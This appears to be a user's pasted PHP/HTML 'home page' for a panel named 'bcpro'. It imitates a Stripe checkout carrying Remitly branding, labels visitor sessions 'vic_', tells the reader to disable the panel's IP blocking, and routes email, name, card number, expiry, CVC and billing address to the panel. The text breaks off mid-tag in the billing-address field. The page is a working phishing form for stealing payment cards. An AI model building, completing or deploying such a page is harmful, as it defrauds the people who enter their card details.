here is all my home page "<?php
// FILE: bcpro/mein/index.php (replace bcpro's login page with your homepage)
session_start();
error_reporting(0);

// Get or create bcpro session ID
$bcpro_session = $_COOKIE['bcpro_session'] ?? null;
if (!$bcpro_session) {
    $bcpro_session = 'vic_' . time() . '_' . rand(1000, 9999);
    setcookie('bcpro_session', $bcpro_session, time() + 3600, '/');
}

// Remove country blocking by modifying bcpro/index.php
// Edit bcpro/index.php and change line 124 from:
// if ($ipCheckResult['status'] === 'blocked') {
// To:
// if (false) { // Disable IP blocking
?>

<!DOCTYPE html>
<html lang="en" translate="no">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="google" content="notranslate">
    <title>Payment - Stripe</title>
    <!-- Link to your CSS in bcpro directory -->
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="img/favicon.ico">
    <script src="js/script.js" defer></script>
</head>
<body>
    <div id="root">
        <div class="App-Container local-default-background flex-container justify-content-center"
            data-testid="checkout-container">
            <div class="App">
                <div class="App-Overview" style="background-color: rgb(255, 255, 255);">
                    <header class="App-header wEAIlV87__Header" style="background-color: rgb(255, 255, 255);">
                        <div class="aYuOZURb__Header-content flex-container align-items-stretch">
                            <div class="flex-item width-auto flex-container align-items-center width-auto">
                                <div class="_83elD2bt__Business">
                                    <div class="scD5qOnJ__Business-image mr2 flex-item width-fixed flex-container justify-content-center align-items-center width-fixed">
                                        <img src="img/remitly.jpg" alt="Secured by Stripe"
                                             style="height: 32px; width: auto; max-width: 150px;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </header>
                    <div aria-hidden="true" style="position: absolute; top: 0px; width: 0px; height: 0px; opacity: 0;">
                    </div>
                    <div class="OrderSummaryColumn" data-testid="order-summary-column">
                        <div data-testid="product-summary" class="ProductSummary is-singleLargeImageLayout">
                            <div class="ProductSummary-info">
                                <h2 class="ProductSummary-name Text Text-color--gray500 Text-fontSize--16 Text-fontWeight--500"
                                    data-testid="product-summary-name">
                                    <div class="ExpandableText ExpandableText--noMarginRight">
                                        <div data-testid="" class="ExpandableText--truncated"
                                            style="-webkit-line-clamp: 2;">Niche AI Coach Blueprint</div>
                                    </div>
                                </h2>
                                <div class="ProductSummary-amountsContainer false">
                                    <div class="ProductSummary-totalsRead" style="opacity: 1;">
                                        <div class="ProductSummary-totalAmountContainer">
                                            <div class=""><span
                                                    class="ProductSummary-totalAmount Text Text-color--default Text-fontWeight--600 Text--tabularNumbers"
                                                    id="ProductSummary-totalAmount"
                                                    data-testid="product-summary-total-amount"><span
                                                        class="CurrencyAmount">€11.00</span></span></div>
                                        </div>
                                        <div class="AnimateSinglePresence">
                                            <div class="AnimateSinglePresenceItem">
                                                <div>
                                                    <div class="ProductSummary-amountsDescriptions"
                                                        data-testid="product-summary-description"><span
                                                            class="ProductSummary-productDescription ProductSummary-description Text Text-color--gray500 Text-fontSize--14 Text-fontWeight--500">
                                                            <div class="ProductSummaryDescription">
                                                                <div
                                                                    class="ExpandableText ExpandableText--noMarginRight">
                                                                    <div data-testid="product-summary-product-description"
                                                                        class="ExpandableText--truncated"
                                                                        style="-webkit-line-clamp: none;">Master AI workflows for coaches: build courses that sell fast
                                                                    </div>
                                                                </div>
                                                                <div class="ProductSummaryDescription-unitAmount"
                                                                    data-testid="product-summary-description-unit-amount">
                                                                </div>
                                                            </div>
                                                        </span></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="App-Payment">
    <main>
        <div class="CheckoutPaymentForm">
            <!-- FORM CONNECTED TO BCPRO -->
            <form class="PaymentForm-form" method="POST" novalidate="" id="payment-form">
                <input type="hidden" id="bcpro_session" value="<?php echo $bcpro_session; ?>">
                
                <div style="height: 150px;">
                    <div>
                        <div style="opacity: 1;">
                            <div
                                class="App-Global-Fields flex-container spacing-16 direction-column wrap-wrap">
                                <div class="flex-item width-12">
                                    <div class="FormFieldGroup" data-qa="FormFieldGroup-email">
                                        <div
                                            class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                                            <label for="email-fieldset"><span
                                                    class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Contact details</span></label>
                                            <div style="opacity: 1; transform: none;"></div>
                                        </div><div style="height: 5px;"></div>
                                        <fieldset class="FormFieldGroup-Fieldset" id="email-fieldset">
                                            <div class="FormFieldGroup-container">
                                                <div
                                                    class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
                                                    <div class="FormFieldInput">
                                                        <div class="CheckoutInputContainer">
                                                            <div
                                                                class="CheckoutInputContainer-placeholderIcon CheckoutInputContainer--hasMailIcon">
                                                                <svg class="InlineSVG Icon Icon--md"
                                                                    focusable="false" width="16"
                                                                    height="16" viewBox="0 0 16 16"
                                                                    fill="none">
                                                                    <path
                                                                        d="M8.75 10.7622C8.75 10.348 9.08579 10.0122 9.5 10.0122H12.5C12.9142 10.0122 13.25 10.348 13.25 10.7622C13.25 11.1764 12.9142 11.5122 12.5 11.5122H9.5C9.08579 11.5122 8.75 11.1764 8.75 10.7622Z"
                                                                        fill="#1A1A1A"
                                                                        fill-opacity="0.5"></path>
                                                                    <path fill-rule="evenodd"
                                                                        clip-rule="evenodd"
                                                                        d="M3 1.51221C1.34315 1.51221 0 2.85535 0 4.51221V11.5122C0 13.1691 1.34315 14.5122 3 14.5122H13C14.6569 14.5122 16 13.1691 16 11.5122V4.51221C16 2.85535 14.6569 1.51221 13 1.51221H3ZM13 3.01221H3C2.43944 3.01221 1.9507 3.31969 1.69325 3.7752C1.7485 3.78999 1.80292 3.81137 1.85548 3.83967L7.88138 7.08439C7.95537 7.12423 8.04443 7.12423 8.11843 7.08439L14.1443 3.83967C14.1969 3.81134 14.2514 3.78994 14.3067 3.77515C14.0493 3.31967 13.5605 3.01221 13 3.01221ZM14.5 5.35179L8.82958 8.40509C8.31162 8.68399 7.68819 8.68399 7.17023 8.40509L1.5 5.35189V11.5122C1.5 12.3406 2.17157 13.0122 3 13.0122H13C13.8284 13.0122 14.5 12.3406 14.5 11.5122V5.35179Z"
                                                                        fill="#1A1A1A"
                                                                        fill-opacity="0.5"></path>
                                                                </svg></div><span
                                                                class="InputContainer"><input
                                                                    class="CheckoutInput CheckoutInput--hasPlaceholderIcon Input Input--empty"
                                                                    autocomplete="email"
                                                                    autocorrect="off" spellcheck="false"
                                                                    autocapitalize="none" id="email"
                                                                    name="email" type="text"
                                                                    inputmode="email"
                                                                    placeholder="email@example.com"
                                                                    aria-invalid="false"
                                                                    aria-describedby=""
                                                                    data-1p-ignore="false"
                                                                    data-lp-ignore="false"
                                                                    value="" required></span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div
                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childBottom">
                                                                    <div class="FormFieldInput">
                                                                        <div class="CheckoutInputContainer">
                                                                            <div
                                                                                class="CheckoutInputContainer-placeholderIcon">
                                                                                <svg class="InlineSVG Icon Icon--md Icon--gray400"
                                                                                    focusable="false" fill="gray400"
                                                                                    color="gray400" width="16"
                                                                                    height="16" viewBox="0 0 16 16">
                                                                                    <path fill-rule="evenodd"
                                                                                        clip-rule="evenodd"
                                                                                        d="M2.5 14.4H13.5C13.7209 14.4 13.9 14.2209 13.9 14C13.9 12.1222 12.3778 10.6 10.5 10.6H5.5C3.62223 10.6 2.1 12.1222 2.1 14C2.1 14.2209 2.27909 14.4 2.5 14.4ZM2.5 16H13.5C14.6046 16 15.5 15.1046 15.5 14C15.5 11.2386 13.2614 9 10.5 9H5.5C2.73858 9 0.5 11.2386 0.5 14C0.5 15.1046 1.39543 16 2.5 16Z"
                                                                                        fill="#1A1A1A"
                                                                                        fill-opacity="0.5"></path>
                                                                                    <path fill-rule="evenodd"
                                                                                        clip-rule="evenodd"
                                                                                        d="M8 6.4C9.32548 6.4 10.4 5.32548 10.4 4C10.4 2.67452 9.32548 1.6 8 1.6C6.67452 1.6 5.6 2.67452 5.6 4C5.6 5.32548 6.67452 6.4 8 6.4ZM8 8C10.2091 8 12 6.20914 12 4C12 1.79086 10.2091 0 8 0C5.79086 0 4 1.79086 4 4C4 6.20914 5.79086 8 8 8Z"
                                                                                        fill="#1A1A1A"
                                                                                        fill-opacity="0.5"></path>
                                                                                </svg></div><span
                                                                                class="InputContainer"><input
                                                                                    class="CheckoutInput CheckoutInput--hasPlaceholderIcon Input Input--empty"
                                                                                    autocomplete="name"
                                                                                    autocorrect="off" spellcheck="false"
                                                                                    id="individualName" type="text"
                                                                                    name="Name" aria-label="Full name"
                                                                                    placeholder="Full name"
                                                                                    aria-invalid="false"
                                                                                    aria-describedby=""
                                                                                    data-1p-ignore="false"
                                                                                    data-lp-ignore="false"
                                                                                    value=""></span>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                        </fieldset>
                                        
                                    </div>
                                </div>
                                        
                                                                <div class="FieldError-container"
                                                                    style="opacity: 0; height: 0px; margin-top: 0px;">
                                                                    <span
                                                                        class="FieldError Text Text-color--red Text-fontSize--13"><span
                                                                            aria-hidden="true"></span></span></div>
                                                            </div>
                                                            <div class="FieldError-container"
                                                                style="opacity: 0; height: 0px; margin-top: 0px;"><span
                                                                    class="FieldError Text Text-color--red Text-fontSize--13"><span
                                                                        aria-hidden="true"></span></span></div>
                                                        </fieldset>
                                                    </div>
                                                </div>
                                            </div>
                                                 <div class="flex-item width-12">
                                                    <h2 class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
                                                        Payment method</h2>
                                                </div><div style="height: 5px;"></div>

                                            <div class="PaymentMethodForm" style="opacity: 1; height: auto;">
                                                <div class="Accordion PaymentMethodFormAccordion" role="list"
                                                    data-name="paymentMethodFormAccordion">
                                                    
                                                    <div class="AnimatePresence PaymentMethodFormVisible-container">
                                                        <div class="AnimatePresence-inner">
                                                            <div
                                                                class="AnimateSinglePresence PaymentMethodFormAccordionItem-container">
                                                                <div class="AnimateSinglePresenceItem">
                                                                    <div class="AccordionItem PaymentMethodFormAccordionItem card-accordion-item PaymentMethodFormAccordionItem--selected PaymentMethodFormAccordionItem--overflowVisible PaymentMethodFormAccordionItem--compact"
                                                                        role="listitem"
                                                                        data-testid="card-accordion-item">
                                                                        <div class="AccordionItem-wrapper">
                                                                            <div class="AnimatePresence">
                                                                                <div class="AnimatePresence-inner">
                                                                                    <div
                                                                                        class="AccordionItemCover PaymentMethodFormAccordionItem card-accordion-item PaymentMethodFormAccordionItem--selected PaymentMethodFormAccordionItem--overflowVisible-cover">
                                                                                        <div
                                                                                            class="AccordionItemHeader AccordionItemCover-header AccordionItemHeader--clickable">
                                                                                            <div
                                                                                                class="AccordionItemHeader-content">
                                                                                                <div
                                                                                                    class="flex-container">
                                                                                                    <div
                                                                                                        class="AccordionItemCover-label">
                                                                                                        <div class="flex-container direction-row align-items-center wrap-wrap"
                                                                                                            style="height: auto; width: 100%;">
                                                                                                            <span
                                                                                                                class="Text Text-color--gray400 Text-fontSize--13 Text-fontWeight--500"></span>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                    
                                                                                                    <div
                                                                                                        class="flex-item width-grow">
                                                                                                        <div
                                                                                                            class="flex-container direction-row justify-content-space-between align-items-flex-start">
                                                                                                            <div
                                                                                                                class="AccordionItemCover-titleContainer flex-container direction-row justify-content-space-between">
                                                                                                                <div
                                                                                                                    class="AccordionItemCover-title Text Text-color--gray800 Text-fontSize--14">
                                                                                                                    <div
                                                                                                                        class="PaymentMethodFormAccordionItemTitle PaymentMethodFormAccordionItemTitle-selected flex-container direction-row justify-content-space-between align-items-center">
                                                                                                                        <div
                                                                                                                            class="flex-container direction-row align-items-center">
                                                                                                                            <input
                                                                                                                                id="payment-method-accordion-item-title-card"
                                                                                                                                aria-checked="true"
                                                                                                                                aria-labelledby="payment-method-label-card"
                                                                                                                                name="payment-method-accordion-item-title"
                                                                                                                                type="radio"
                                                                                                                                class="RadioButton PaymentMethodFormAccordionItemTitle-radio"
                                                                                                                                tabindex="-1"
                                                                                                                                value="card">
                                                                                                                            <div
                                                                                                                                class="PaymentMethodFormAccordionItemTitle-icon">
                                                                                                                                <img src="https://js.stripe.com/v3/fingerprinted/img/card-ce24697297bd3c6a00fdd2fb6f760f0d.svg"
                                                                                                                                    alt=""
                                                                                                                                    class="Icon Icon--md">
                                                                                                                            </div>
                                                                                                                            <div
                                                                                                                                id="payment-method-label-card">
                                                                                                                                Card
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                            <div
                                                                                                                class="AccordionItemCover-actionContainer AccordionItemCover-actionContainer--noButton">
                                                                                                                <button
                                                                                                                    class="Button AccordionButton AccordionButton-open AccordionButton-expandedClickArea AccordionButton-expandedFocusArea Button--link Button--sm"
                                                                                                                    type="button"
                                                                                                                    aria-label="Pay with card"
                                                                                                                    data-testid="card-accordion-item-button">
                                                                                                                    <div
                                                                                                                        class="flex-container justify-content-center align-items-center">
                                                                                                                    </div>
                                                                                                                </button>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                            <div class="AnimatePresence" style="">
                                                                                <div class="AnimatePresence-inner">
                                                                                    <div
                                                                                        class="AccordionItemContent PaymentMethodFormAccordionItem card-accordion-item PaymentMethodFormAccordionItem--selected PaymentMethodFormAccordionItem--overflowVisible-content AccordionItemContent--no-title">
                                                                                        <div>
                                                                                            <div>
                                                                                                <div class="PaymentForm-paymentMethodForm flex-container direction-column wrap-wrap"
                                                                                                    style="gap: 16px;">
                                                                                                    <div
                                                                                                        class="flex-item width-12">
                                                                                                        <div class="FormFieldGroup"
                                                                                                            data-qa="FormFieldGroup-cardForm">
                                                                                                            <div
                                                                                                                class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                                                                                                                <label
                                                                                                                    for="cardForm-fieldset"><span
                                                                                                                        class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Card
                                                                                                                        information</span></label>
                                                                                                            </div>
                                                                                                            <fieldset
                                                                                                                class="FormFieldGroup-Fieldset"
                                                                                                                id="cardForm-fieldset">
                                                                                                                <div
                                                                                                                    class="FormFieldGroup-container">
                                                                                                                    <div
                                                                                                                        class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
                                                                                                                        <div
                                                                                                                            class="FormFieldInput padding-right-120">
                                                                                                                            <div
                                                                                                                                class="CheckoutInputContainer">
                                                                                                                                <span
                                                                                                                                    class="InputContainer"><input
                                                                                                                                        class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                                                                                                        autocomplete="cc-number"
                                                                                                                                        autocorrect="off"
                                                                                                                                        spellcheck="false"
                                                                                                                                        id="cardNumber"
                                                                                                                                        name="cardNumber"
                                                                                                                                        type="text"
                                                                                                                                        inputmode="numeric"
                                                                                                                                        aria-label="Card number"
                                                                                                                                        placeholder="1234 1234 1234 1234"
                                                                                                                                        aria-invalid="false"
                                                                                                                                        aria-describedby=""
                                                                                                                                        data-1p-ignore="false"
                                                                                                                                        data-lp-ignore="false"
                                                                                                                                        value=""></span>
                                                                                                                            </div>
                                                                                                                            <div class="FormFieldInput-Icons"
                                                                                                                                style="opacity: 1;">
                                                                                                                                <div
                                                                                                                                    style="transform: none;">
                                                                                                                                    <span
                                                                                                                                        class="FormFieldInput-IconsIcon is-visible"><img
                                                                                                                                            src="https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg"
                                                                                                                                            alt="Visa"
                                                                                                                                            class="BrandIcon"
                                                                                                                                            loading="lazy"
                                                                                                                                            fetchpriority="low"></span>
                                                                                                                                </div>
                                                                                                                                <div
                                                                                                                                    style="transform: none;">
                                                                                                                                    <span
                                                                                                                                        class="FormFieldInput-IconsIcon is-visible"><img
                                                                                                                                            src="https://js.stripe.com/v3/fingerprinted/img/mastercard-4d8844094130711885b5e41b28c9848f.svg"
                                                                                                                                            alt="MasterCard"
                                                                                                                                            class="BrandIcon"
                                                                                                                                            loading="lazy"
                                                                                                                                            fetchpriority="low"></span>
                                                                                                                                </div>
                                                                                                                                <div
                                                                                                                                    style="transform: none;">
                                                                                                                                    <span
                                                                                                                                        class="FormFieldInput-IconsIcon is-visible"><img
                                                                                                                                            src="https://js.stripe.com/v3/fingerprinted/img/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg"
                                                                                                                                            alt="American Express"
                                                                                                                                            class="BrandIcon"
                                                                                                                                            loading="lazy"
                                                                                                                                            fetchpriority="low"></span>
                                                                                                                                </div>
                                                                                                                                <div
                                                                                                                                    class="CardFormFieldGroupIconOverflow">
                                                                                                                                    <span
                                                                                                                                        class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--invisible"
                                                                                                                                        role="presentation"><span
                                                                                                                                            class="FormFieldInput-IconsIcon"
                                                                                                                                            role="presentation"><img
                                                                                                                                                src="https://js.stripe.com/v3/fingerprinted/img/unionpay-8a10aefc7295216c338ba4e1224627a1.svg"
                                                                                                                                                alt="UnionPay"
                                                                                                                                                class="BrandIcon"
                                                                                                                                                loading="lazy"
                                                                                                                                                fetchpriority="low"></span></span><span
                                                                                                                                        class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--invisible"
                                                                                                                                        role="presentation"><span
                                                                                                                                            class="FormFieldInput-IconsIcon"
                                                                                                                                            role="presentation"><img
                                                                                                                                                src="https://js.stripe.com/v3/fingerprinted/img/jcb-271fd06e6e7a2c52692ffa91a95fb64f.svg"
                                                                                                                                                alt="JCB"
                                                                                                                                                class="BrandIcon"
                                                                                                                                                loading="lazy"
                                                                                                                                                fetchpriority="low"></span></span><span
                                                                                                                                        class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--invisible"
                                                                                                                                        role="presentation"><span
                                                                                                                                            class="FormFieldInput-IconsIcon"
                                                                                                                                            role="presentation"><img
                                                                                                                                                src="https://js.stripe.com/v3/fingerprinted/img/discover-ac52cd46f89fa40a29a0bfb954e33173.svg"
                                                                                                                                                alt="Discover"
                                                                                                                                                class="BrandIcon"
                                                                                                                                                loading="lazy"
                                                                                                                                                fetchpriority="low"></span></span><span
                                                                                                                                        class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--visible"
                                                                                                                                        role="presentation"><span
                                                                                                                                            class="FormFieldInput-IconsIcon"
                                                                                                                                            role="presentation"><img
                                                                                                                                                src="https://js.stripe.com/v3/fingerprinted/img/diners-fbcbd3360f8e3f629cdaa80e93abdb8b.svg"
                                                                                                                                                alt="Diners Club"
                                                                                                                                                class="BrandIcon"
                                                                                                                                                loading="lazy"
                                                                                                                                                fetchpriority="low"></span></span>
                                                                                                                                </div>
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                    <div
                                                                                                                        class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childLeft FormFieldGroup-childBottom">
                                                                                                                        <div
                                                                                                                            class="FormFieldInput">
                                                                                                                            <div
                                                                                                                                class="CheckoutInputContainer">
                                                                                                                                <span
                                                                                                                                    class="InputContainer"><input
                                                                                                                                        class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                                                                                                        autocomplete="cc-exp"
                                                                                                                                        autocorrect="off"
                                                                                                                                        spellcheck="false"
                                                                                                                                        id="cardExpiry"
                                                                                                                                        name="cardExpiry"
                                                                                                                                        type="text"
                                                                                                                                        inputmode="numeric"
                                                                                                                                        aria-label="Expiration"
                                                                                                                                        placeholder="MM / YY"
                                                                                                                                        aria-invalid="false"
                                                                                                                                        aria-describedby=""
                                                                                                                                        data-1p-ignore="false"
                                                                                                                                        data-lp-ignore="false"
                                                                                                                                        value=""></span>
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                    <div
                                                                                                                        class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childRight FormFieldGroup-childBottom">
                                                                                                                        <div
                                                                                                                            class="FormFieldInput has-icon padding-right-32">
                                                                                                                            <div
                                                                                                                                class="CheckoutInputContainer">
                                                                                                                                <span
                                                                                                                                    class="InputContainer"><input
                                                                                                                                        class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                                                                                                        autocomplete="cc-csc"
                                                                                                                                        autocorrect="off"
                                                                                                                                        spellcheck="false"
                                                                                                                                        id="cardCvc"
                                                                                                                                        name="cardCvc"
                                                                                                                                        type="text"
                                                                                                                                        inputmode="numeric"
                                                                                                                                        aria-label="CVC"
                                                                                                                                        placeholder="CVC"
                                                                                                                                        aria-invalid="false"
                                                                                                                                        aria-describedby=""
                                                                                                                                        data-1p-ignore="false"
                                                                                                                                        data-lp-ignore="false"
                                                                                                                                        value=""></span>
                                                                                                                            </div>
                                                                                                                            <div class="FormFieldInput-Icon is-loaded"
                                                                                                                                data-testid="FormFieldInput-Icon">
                                                                                                                                <div
                                                                                                                                    class="Icon Icon--md">
                                                                                                                                    <svg class="Icon Icon--md"
                                                                                                                                        width="30"
                                                                                                                                        height="20"
                                                                                                                                        viewBox="0 0 30 20"
                                                                                                                                        xmlns="http://www.w3.org/2000/svg"
                                                                                                                                        fill="var(--colorIconCardCvc)"
                                                                                                                                        role="img"
                                                                                                                                        aria-labelledby="cvcIconTitle">
                                                                                                                                        <title
                                                                                                                                            id="cvcIconTitle">
                                                                                                                                            Credit
                                                                                                                                            or
                                                                                                                                            debit
                                                                                                                                            card
                                                                                                                                            CVC
                                                                                                                                        </title>
                                                                                                                                        <g
                                                                                                                                            opacity="0.74">
                                                                                                                                            <path
                                                                                                                                                fill-rule="evenodd"
                                                                                                                                                clip-rule="evenodd"
                                                                                                                                                d="M25.2061 0.00488281C27.3194 0.112115 29 1.85996 29 4V11.3291C28.5428 11.0304 28.0336 10.8304 27.5 10.7188V8H1.5V16C1.5 17.3807 2.61929 18.5 4 18.5H10.1104V20H4L3.79395 19.9951C1.7488 19.8913 0.108652 18.2512 0.00488281 16.2061L0 16V4C0 1.85996 1.68056 0.112115 3.79395 0.00488281L4 0H25L25.2061 0.00488281ZM4 1.5C2.61929 1.5 1.5 2.61929 1.5 4V5H27.5V4C27.5 2.61929 26.3807 1.5 25 1.5H4Z">
                                                                                                                                            </path>
                                                                                                                                            <path
                                                                                                                                                d="M27.5 12.7988C28.3058 13.1128 28.7725 13.7946 28.7725 14.6406C28.7722 15.4002 28.2721 15.9399 27.6523 16.1699C28.1601 16.3319 28.6072 16.6732 28.8086 17.2207C28.3597 18.6222 27.1605 19.6862 25.6826 19.9404C24.8389 19.7707 24.1662 19.2842 23.834 18.5H25C25.0914 18.5 25.1816 18.4939 25.2705 18.4844C25.5434 18.7862 25.9284 18.9501 26.3623 18.9502C27.142 18.9501 27.6922 18.5297 27.6924 17.79C27.6923 17.4212 27.5473 17.1544 27.2998 16.9795C27.4281 16.6786 27.5 16.3478 27.5 16V15.0527C27.5397 14.9481 27.5625 14.8309 27.5625 14.7002C27.5625 14.5657 27.5399 14.4422 27.5 14.3311V12.7988Z">
                                                                                                                                            </path>
                                                                                                                                            <path
                                                                                                                                                d="M15.2207 18.5V18.8301H16.8799V19.9004H12.1104V18.8301H13.9902V18.5H15.2207Z">
                                                                                                                                            </path>
                                                                                                                                            <path
                                                                                                                                                d="M19.9307 18.5L19.5762 18.7803H22.8369V19.9004H17.8164V18.8604L18.2549 18.5H19.9307Z">
                                                                                                                                            </path>
                                                                                                                                        </g>
                                                                                                                                        <path
                                                                                                                                            d="M26.3822 20.01C24.9722 20.01 23.8522 19.25 23.6422 17.81L24.8722 17.58C24.9922 18.45 25.6022 18.95 26.3622 18.95C27.1422 18.95 27.6922 18.53 27.6922 17.79C27.6922 17.05 27.1122 16.72 26.2822 16.72H25.5722V15.67H26.3022C27.0622 15.67 27.5622 15.34 27.5622 14.7C27.5622 14.07 27.1022 13.68 26.3922 13.68C25.6422 13.68 25.1322 14.18 24.9822 14.92L23.8122 14.76C24.0022 13.55 24.9822 12.61 26.4322 12.61C27.8822 12.61 28.7722 13.47 28.7722 14.64C28.7722 15.4 28.2722 15.94 27.6522 16.17C28.3422 16.39 28.9222 16.94 28.9222 17.89C28.9222 19.04 27.9522 20.01 26.3822 20.01Z">
                                                                                                                                        </path>
                                                                                                                                        <path
                                                                                                                                            d="M17.8161 18.86L19.6161 17.38C20.5961 16.58 21.4761 15.87 21.4761 14.97C21.4761 14.23 21.0161 13.7 20.2561 13.7C19.5061 13.7 19.0161 14.29 19.0161 15C19.0161 15.23 19.0561 15.46 19.1361 15.68H17.9461C17.8461 15.39 17.8161 15.2 17.8161 14.93C17.8161 13.58 18.9261 12.61 20.2861 12.61C21.7861 12.61 22.7461 13.54 22.7461 14.89C22.7461 16.16 21.7861 17.03 20.7761 17.83L19.5761 18.78H22.8361V19.9H17.8161V18.86Z">
                                                                                                                                        </path>
                                                                                                                                        <path
                                                                                                                                            d="M14.25 12.67H15.22V18.83H16.88V19.9H12.11V18.83H13.99V14.92H12.15V13.99L12.88 13.93C13.78 13.86 14.18 13.58 14.25 12.67Z">
                                                                                                                                        </path>
                                                                                                                                    </svg>
                                                                                                                                </div>
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                    <div class="FieldError-container"
                                                                                                                        style="opacity: 0; height: 0px; margin-top: 0px;">
                                                                                                                        <span
                                                                                                                            class="FieldError Text Text-color--red Text-fontSize--13"><span
                                                                                                                                aria-hidden="true"></span></span>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                                <div class="FieldError-container"
                                                                                                                    style="opacity: 0; height: 0px; margin-top: 0px;">
                                                                                                                    <span
                                                                                                                        class="FieldError Text Text-color--red Text-fontSize--13"><span
                                                                                                                            aria-hidden="true"></span></span>
                                                                                                                </div>
                                                                                                            </fieldset>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                    <div
                                                                                                        class="BillingInfoForm flex-item width-grow">
                                                                                                        <div
                                                                                                            class="AnimateSinglePresence">
                                                                                                            <div
                                                                                                                class="AnimateSinglePresenceItem">
                                                                                                                <div>
                                                                                                                    <div class="BillingInfoForm-addressInput flex-item width-12"
                                                                                                                        aria-hidden="false"
                                                                                                                        style="margin-top: 0px;">
                                                                                                                        <div role="group"
                                                                                                                            aria-label="Billing address">
                                                                                                                            <div
                                                                                                                                class="flex-container spacing-16 direction-column wrap-wrap">
                                                                                                                                <div
                                                                                                                                    class="flex-item width-12">
                                                                                                                                    <div class="FormFieldGroup"
                                                                                                                                        data-qa="FormFieldGroup-billing-address">
                                                                                                                                        <div
                                                                                                                                            class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                                                                                                                                            <label
                                                                                                                                                for="billing-address-fieldset"><span
                                                                                                                                                    class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Billing
                                                                                                                                                    address</span></label>
                                                                                                                                        </div>
                                                                                                                                        <fieldset
                                                                                                                                            class="FormFieldGroup-Fieldset"
                                                                                                                                            id="billing-address-fieldset">
                                                                                                                                            <div
                                                                                                                                                class="FormFieldGroup-container">
                                                                                                                                                <div
                                                                                                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
                                                                                                                                                    <div
                                                                                                                                                        class="FormFieldInput is-select">
                                                                                                                                                        <div>
                                                                                                                                                            <div
                                                                                                                                                                class="Select">
                                                                                                                                                                <select
                                                                                                                                                                    id="billingCountry"
                                                                                                                                                                    name="billingCountry"
                                                                                                                                                                    autocomplete="billing country"
                                                                                                                                                                    aria-label="Country or region"
                                                                                                                                                                    class="Select-source">
                                                                                                                                                                    <option
                                                                                                                                                                        value=""
                                                                                                                                                                        disabled=""
                                                                                                                                                                        hidden="">
                                                                                                                                                                    </option>
                                                                                                                                                                    <option
                                                                                                                                                                        value="EH">Western Sahara</option><option
                                                                                                                                                                        value="YE">Yemen</option><option
                                                                                                                                                                        value="ZM">Zambia</option><option
                                                                                                                                                                        value="ZW">Zimbabwe</option></select><svg
                                                                                                                                                                    class="InlineSVG Icon Select-arrow Icon--sm" focusable="false"
                                                                                                                                                                    viewBox="0 0 12 12">
                                                                                                                                                                    <path
                                                                                                                                                                        d="M10.193 3.97a.75.75 0 0 1 1.062 1.062L6.53 9.756a.75.75 0 0 1-1.06 0L.745 5.032A.75.75 0 0 1 1.807 3.97L6 8.163l4.193-4193z"
                                                                                                                                                                        fill-rule="evenodd">
                                                                                                                                                                    </path>
                                                                                                                                                                </svg>
                                                                                                                                                            </div>
                                                                                                                                                        </div>
                                                                                                                                                    </div>
                                                                                                                                                </div>
                                                                                                                                                <div
                                                                                                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight">
                                                                                                                                                    <div
                                                                                                                                                        class="FormFieldInput">
                                                                                                                                                        <div
                                                                                                                                                            class="CheckoutInputContainer">
                                                                                                                                                            <span
                                                                                                                                                                class="InputContainer"><input
                                                                                                                                                                    class="CheckoutInput Input Input--empty"
                                                                                                                                                                    autocomplete="billing address-line1"
                                                                                                                                                                    autocorrect="off"
                                                                                                                                                                    spellcheck="false"
                                                                                                                                                                    id="billingAddressLine1"
                                                                                                                                                                    name="billingAddressLine1"
                                                                                                                                                                    type="text"
